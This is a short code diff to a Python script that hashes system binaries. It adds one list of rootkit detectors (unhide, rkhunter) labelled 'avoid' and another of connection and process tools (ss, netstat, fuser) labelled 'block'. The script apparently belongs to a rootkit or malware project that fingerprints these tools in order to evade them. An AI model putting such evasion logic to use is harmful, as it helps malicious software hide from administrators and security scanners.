@@ -29,12 +29,17 @@ def save_hashes_to_file(file_paths, output_path):
                 print(f"File not found: {file_path}")
 
 
-bin_paths = [
+binavoid_paths = [
     "/bin/unhide",
     "/bin/rkhunter"
 ]
 
-output_path = "__tmphashtable"
+binblock_paths = [
+    "/bin/ss",
+    "/bin/netstat",
+    "/bin/fuser"
+]
 
-save_hashes_to_file(bin_paths, output_path)
+save_hashes_to_file(binavoid_paths, "__tmphashtable")
+save_hashes_to_file(binblock_paths, "__tmp2hashtable")
 
